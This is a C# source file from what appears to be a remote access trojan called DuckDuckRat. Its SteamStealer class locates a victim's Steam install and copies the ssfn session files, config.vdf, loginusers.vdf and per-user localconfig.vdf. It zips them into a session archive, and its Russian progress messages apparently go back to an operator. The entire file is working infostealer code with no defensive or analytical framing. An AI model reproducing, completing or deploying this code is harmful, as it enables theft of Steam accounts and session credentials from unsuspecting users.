using System;
using System.IO;
using System.Collections.Generic;
using System.IO.Compression;
using Microsoft.Win32;
using System.Diagnostics;
using System.Linq;

namespace DuckDuckRat.Stealers
{
    public static class SteamStealer
    {
        public class StealResult
        {
            public string? ZipPath { get; set; }
            public int SsfnCount { get; set; }
            public bool ConfigFound { get; set; }
            public string? Error { get; set; }
        }

        public static async System.Threading.Tasks.Task<StealResult> RunSteal(Action<string> onProgress)
        {
            var result = new StealResult();
            string tempDir = Path.Combine(Path.GetTempPath(), "DUCK DUCK RAT v1_Steam_" + Guid.NewGuid().ToString("N"));
            
            try
            {
                onProgress("🔍 <b>Поиск инсталляции Steam...</b>");
                string steamPath = GetSteamPath();
                
                if (string.IsNullOrEmpty(steamPath) || !Directory.Exists(steamPath))
                {
                    result.Error = "Steam installation not found.";
                    return result;
                }

                Directory.CreateDirectory(tempDir);
                onProgress($"📂 <b>Steam найден:</b> <code>{steamPath}</code>\n📦 <i>Начинаю сбор данных...</i>");

                // 1. Collect SSFN files
                var ssfnFiles = Directory.GetFiles(steamPath, "ssfn*", SearchOption.TopDirectoryOnly);
                foreach (var file in ssfnFiles)
                {
                    try {
                        File.Copy(file, Path.Combine(tempDir, Path.GetFileName(file)), true);
                        result.SsfnCount++;
                    } catch { }
                }

                // 2. Collect Config
                string configPath = Path.Combine(steamPath, "config");
                if (Directory.Exists(configPath))
                {
                    onProgress("🍪 <b>Копирую конфигурацию (config.vdf)...</b>");
                    string destConfig = Path.Combine(tempDir, "config");
                    Directory.CreateDirectory(destConfig);
                    
                    string[] criticalFiles = { "config.vdf", "loginusers.vdf", "steamapps.vrmanifest" };
                    foreach (var cf in criticalFiles)
                    {
                        string src = Path.Combine(configPath, cf);
                        if (File.Exists(src))
                        {
                            File.Copy(src, Path.Combine(destConfig, cf), true);
                            result.ConfigFound = true;
                        }
                    }
                }

                // 3. UserData (Top level only to save space)
                string userDataPath = Path.Combine(steamPath, "userdata");
                if (Directory.Exists(userDataPath))
                {
                    onProgress("👤 <b>Собираю метаданные пользователей...</b>");
                    string destUserData = Path.Combine(tempDir, "userdata");
                    Directory.CreateDirectory(destUserData);
                    
                    // Just take localconfig.vdf from each user for context
                    foreach (var userDir in Directory.GetDirectories(userDataPath))
                    {
                        string userId = Path.GetFileName(userDir);
                        string userConfig = Path.Combine(userDir, "config", "localconfig.vdf");
                        if (File.Exists(userConfig))
                        {
                            string userDest = Path.Combine(destUserData, userId, "config");
                            Directory.CreateDirectory(userDest);
                            File.Copy(userConfig, Path.Combine(userDest, "localconfig.vdf"), true);
                        }
                    }
                }

                // 4. Zip it
                onProgress("🗜 <b>Архивация сессии...</b>");
                string zipPath = Path.Combine(Path.GetTempPath(), $"SteamSession_{DateTime.Now:yyyyMMdd_HHmmss}.zip");
                if (File.Exists(zipPath)) File.Delete(zipPath);
                
                ZipFile.CreateFromDirectory(tempDir, zipPath, CompressionLevel.Optimal, false);
                result.ZipPath = zipPath;

                return result;
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
                return result;
            }
            finally
            {
                try { if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true); } catch { }
            }
        }

        private static string GetSteamPath()
        {
            try
            {
                // Try Registry
                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam"))
                {
                    if (key != null)
                    {
                        string? path = key.GetValue("SteamPath") as string;
                        if (!string.IsNullOrEmpty(path)) return path.Replace("/", "\\");
                    }
                }

                // Try common paths
                string[] commonPaths = {
                    @"C:\Program Files (x86)\Steam",
                    @"C:\Program Files\Steam",
                    @"D:\Steam",
                    @"E:\Steam"
                };

                foreach (var p in commonPaths) if (Directory.Exists(p)) return p;

                // Try running process
                var proc = Process.GetProcessesByName("Steam").FirstOrDefault();
                if (proc != null && proc.MainModule != null)
                {
                    return Path.GetDirectoryName(proc.MainModule.FileName) ?? "";
                }
            }
            catch { }
            return "";
        }
    }
}


